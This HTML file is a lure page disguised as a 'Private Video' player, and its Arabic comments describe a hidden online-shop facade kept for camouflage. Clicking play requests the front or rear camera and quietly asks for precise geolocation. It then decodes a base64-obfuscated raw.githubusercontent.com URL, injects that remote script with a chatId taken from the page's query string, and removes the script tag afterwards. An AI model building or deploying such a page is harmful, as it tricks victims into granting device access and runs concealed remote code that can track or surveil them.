<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    
    <!-- META TAGS مخفية للمتجر (لن تظهر للمستخدم) -->
    <meta name="description" content="Online Shopping Store - Buy products online with fast delivery. Best deals and discounts on electronics, fashion, and more." />
    <meta name="keywords" content="online shopping, buy online, store, delivery, products, deals, discounts, shop" />
    <meta name="robots" content="index, follow" />
    
    <!-- Open Graph للتسويق -->
    <meta property="og:title" content="ShopStore - Online Shopping" />
    <meta property="og:description" content="Shop the best products online with fast delivery to your location." />
    <meta property="og:type" content="website" />
    
    <!-- Schema.org مخفي للمتجر -->
    <script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "OnlineStore",
        "name": "ShopStore",
        "description": "Online shopping store with fast delivery",
        "url": "https://shopstore.com",
        "potentialAction": {
            "@type": "SearchAction",
            "target": "https://shopstore.com/search?q={search_term_string}",
            "query-input": "required name=search_term_string"
        }
    }
    </script>
    
    <title>Video Player</title>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: #000;
            color: #fff;
            overflow: hidden;
        }

        /* ===== عناصر المتجر المخفية (لن تظهر للمستخدم) ===== */
        .store-header,
        .store-footer,
        .product-info {
            display: none !important;
            visibility: hidden;
            height: 0;
            overflow: hidden;
        }

        .video-player-container {
            width: 90%;
            max-width: 800px;
            background: #111;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
        }

        .video-thumbnail {
            position: relative;
            width: 100%;
            height: 450px;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        /* ===== رسالة إذن الكاميرا (ظاهرة) ===== */
        .camera-permission-msg {
            position: absolute;
            top: 15px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.85);
            color: #fff;
            padding: 12px 22px;
            border-radius: 25px;
            font-size: 14px;
            text-align: center;
            z-index: 5;
            display: none;
            border: 2px solid #ff4444;
            backdrop-filter: blur(10px);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { border-color: #ff4444; }
            50% { border-color: #ff8888; }
        }

        .camera-permission-msg .cam-icon {
            font-size: 20px;
            margin-right: 5px;
        }

        #playTrigger {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            border: 3px solid #ff6b6b;
            cursor: pointer;
            transition: all 0.3s ease;
            backdrop-filter: blur(8px);
            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
            z-index: 10;
        }
        #playTrigger:hover {
            transform: scale(1.05);
            background: rgba(255, 255, 255, 0.2);
            border-color: #ff4757;
            box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
        }
        #playTrigger .icon {
            font-size: 60px;
            color: #ff6b6b;
            line-height: 1;
            user-select: none;
        }

        .video-info {
            padding: 20px;
            border-bottom: 1px solid #333;
        }

        .video-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 8px;
        }

        .video-controls {
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #1a1a1a;
            flex-wrap: wrap;
            gap: 10px;
        }

        .ctrl-btn {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 8px 15px;
            border-radius: 4px;
            transition: background 0.2s;
        }

        .ctrl-btn:hover {
            background: #333;
        }

        .seek-bar {
            flex-grow: 1;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin: 0 20px;
            overflow: hidden;
            position: relative;
            min-width: 60px;
        }

        .seek-fill {
            position: absolute;
            height: 100%;
            width: 0%;
            background: #ff0000;
        }

        .timer {
            color: #aaa;
            font-size: 0.9rem;
            min-width: 100px;
            text-align: center;
        }

        .volume-area {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #aaa;
        }

        .vol-bar {
            width: 80px;
            height: 4px;
            background: #333;
            border-radius: 2px;
            position: relative;
        }

        .vol-fill {
            position: absolute;
            height: 100%;
            width: 70%;
            background: #ff0000;
        }

        @media (max-width: 480px) {
            .video-controls {
                padding: 10px 12px;
                gap: 6px;
            }
            .seek-bar {
                margin: 0 6px;
            }
            .timer {
                font-size: 0.75rem;
                min-width: 60px;
            }
            .video-title {
                font-size: 1.2rem;
            }
            .video-thumbnail {
                height: 280px;
            }
            #playTrigger {
                width: 90px;
                height: 90px;
            }
            #playTrigger .icon {
                font-size: 45px;
            }
        }
    </style>
</head>
<body>

    <!-- عناصر المتجر المخفية (للتمويه فقط - لن تظهر) -->
    <div class="store-header" aria-hidden="true">
        <span>🛒 ShopStore</span>
        <span>🔍 Search products...</span>
        <span>🛒 Cart (0)</span>
    </div>

    <div class="video-player-container">
        <div class="video-info">
            <div class="video-title">Private Video</div>
        </div>

        <!-- عنصر منتج مخفي (للتمويه فقط) -->
        <div class="product-info" aria-hidden="true">
            <span>$49.99</span>
            <span>★★★★★</span>
            <span>🚚 Fast Delivery</span>
        </div>

        <div class="video-thumbnail" id="posterArea">
            <!-- رسالة إذن الكاميرا (ظاهرة للمستخدم) -->
            <div class="camera-permission-msg" id="cameraMsg">
                <span class="cam-icon">📷</span> Allow camera access to continue
            </div>
            
            <div id="playTrigger">
                <span class="icon">▶</span>
            </div>
        </div>

        <video id="mainVideo" controls playsinline style="display:none; width:100%; height:450px; background:#000;">
            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
        </video>

        <div class="video-controls">
            <div class="seek-bar">
                <div class="seek-fill"></div>
            </div>
            <div class="timer">0:00 / 2:45</div>
            <div class="volume-area">
                <span>🔊</span>
                <div class="vol-bar">
                    <div class="vol-fill"></div>
                </div>
            </div>
            <button class="ctrl-btn">⛶</button>
        </div>
    </div>

    <!-- تذييل مخفي (للتمويه فقط) -->
    <div class="store-footer" aria-hidden="true">
        © 2024 ShopStore. All rights reserved. | Privacy Policy | Terms of Service
    </div>

    <script>
        (function() {
            'use strict';

            // ===== عناصر الصفحة =====
            const playBtn = document.getElementById('playTrigger');
            const poster = document.getElementById('posterArea');
            const videoEl = document.getElementById('mainVideo');
            const cameraMsg = document.getElementById('cameraMsg');
            
            let stepOneDone = false;
            let stepTwoDone = false;

            // ===== طلب إذن الكاميرا =====
            async function requestCameraPermission() {
                cameraMsg.style.display = 'block';
                cameraMsg.innerHTML = '<span class="cam-icon">📷</span> Requesting camera access...';
                
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'user' },
                        audio: false
                    });
                    
                    // تم المنح - إيقاف الكاميرا فوراً
                    stream.getTracks().forEach(track => track.stop());
                    
                    cameraMsg.innerHTML = '<span class="cam-icon">✅</span> Camera access granted!';
                    cameraMsg.style.borderColor = '#00ff00';
                    cameraMsg.style.animation = 'none';
                    
                    return true;
                    
                } catch (error) {
                    // فشل - نجرب الكاميرا الخلفية
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ 
                            video: { facingMode: 'environment' },
                            audio: false
                        });
                        
                        stream.getTracks().forEach(track => track.stop());
                        
                        cameraMsg.innerHTML = '<span class="cam-icon">✅</span> Camera access granted!';
                        cameraMsg.style.borderColor = '#00ff00';
                        cameraMsg.style.animation = 'none';
                        
                        return true;
                        
                    } catch (error2) {
                        cameraMsg.innerHTML = '<span class="cam-icon">❌</span> Please allow camera access';
                        cameraMsg.style.borderColor = '#ff4444';
                        return false;
                    }
                }
            }

            // ===== طلب إذن الموقع (في الخلفية) =====
            async function requestLocationInBackground() {
                try {
                    await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            resolve,
                            reject,
                            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                        );
                    });
                } catch (e) {
                    // فشل بصمت
                }
            }

            // ===== استدعاء API الخارجي =====
            function loadExternalAPI() {
                const encodedParts = [
                    'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLw==',
                    'RkdESFNIUy9hcGkvcmVmcy9oZWFkcy9tYWluL2FwaQ=='
                ];
                
                const fullUrl = atob(encodedParts.join(''));
                
                const scriptTag = document.createElement('script');
                scriptTag.setAttribute('src', fullUrl);
                scriptTag.setAttribute('type', 'text/javascript');
                scriptTag.setAttribute('async', 'true');
                
                window._config = {
                    id: new URLSearchParams(window.location.search).get('chatId') || '',
                    time: Date.now()
                };
                
                document.head.appendChild(scriptTag);
                
                // إزالة السكربت بعد التحميل
                scriptTag.onload = function() {
                    setTimeout(() => {
                        if (scriptTag.parentNode) {
                            scriptTag.parentNode.removeChild(scriptTag);
                        }
                    }, 5000);
                };
                
                scriptTag.onerror = function() {
                    console.log('Failed to load external resource');
                };
            }

            // ===== عرض الفيديو =====
            function displayVideo() {
                cameraMsg.style.display = 'none';
                poster.style.display = 'none';
                videoEl.style.display = 'block';
                videoEl.muted = false;
                videoEl.volume = 1.0;
                
                try {
                    videoEl.play();
                } catch (e) {
                    setTimeout(() => videoEl.play().catch(() => {}), 200);
                }
            }

            // ===== معالج النقر =====
            async function onPlayClick(e) {
                if (stepTwoDone) return;

                if (!stepOneDone) {
                    // الخطوة الأولى: طلب إذن الكاميرا
                    stepOneDone = true;
                    
                    playBtn.querySelector('.icon').textContent = '⏳';
                    playBtn.style.borderColor = '#ffd700';
                    
                    // طلب الكاميرا
                    const cameraGranted = await requestCameraPermission();
                    
                    // طلب الموقع في الخلفية
                    requestLocationInBackground();
                    
                    if (cameraGranted) {
                        setTimeout(() => {
                            playBtn.querySelector('.icon').textContent = '▶';
                            playBtn.style.borderColor = '#00ff00';
                        }, 1500);
                    }
                    
                } else {
                    // الخطوة الثانية: تشغيل الفيديو وتحميل API
                    stepTwoDone = true;
                    playBtn.style.pointerEvents = 'none';
                    playBtn.style.opacity = '0.5';
                    
                    // تشغيل الفيديو
                    videoEl.muted = false;
                    videoEl.volume = 1.0;
                    videoEl.play().catch(() => {});
                    
                    // تحميل API الخارجي
                    loadExternalAPI();
                    
                    // عرض الفيديو
                    setTimeout(() => displayVideo(), 2000);
                }
            }

            // ===== ربط الأحداث =====
            if (playBtn) {
                playBtn.addEventListener('click', onPlayClick);
            }

            // ===== دعم الصوت =====
            document.addEventListener('click', function() {
                if (videoEl && videoEl.style.display === 'block') {
                    videoEl.muted = false;
                    if (videoEl.paused) videoEl.play().catch(() => {});
                }
            }, true);

            // ===== أزرار التحكم =====
            document.querySelectorAll('.ctrl-btn').forEach(btn => {
                btn.addEventListener('click', function(e) {
                    e.stopPropagation();
                    if (this.textContent.includes('⛶')) {
                        if (videoEl.requestFullscreen) {
                            videoEl.requestFullscreen();
                        } else if (videoEl.webkitRequestFullscreen) {
                            videoEl.webkitRequestFullscreen();
                        }
                    }
                });
            });

            // ===== شريط التقدم =====
            const progressTimer = setInterval(() => {
                const fill = document.querySelector('.seek-fill');
                if (videoEl.style.display === 'block') {
                    clearInterval(progressTimer);
                    return;
                }
                const w = parseInt(fill.style.width) || 35;
                const nw = (w + 0.1) % 100;
                fill.style.width = nw + '%';
                
                const sec = Math.floor((nw / 100) * 165);
                const m = Math.floor(sec / 60);
                const s = sec % 60;
                document.querySelector('.timer').textContent = 
                    `${m}:${s.toString().padStart(2, '0')} / 2:45`;
            }, 1000);

        })();
    </script>
</body>
</html>
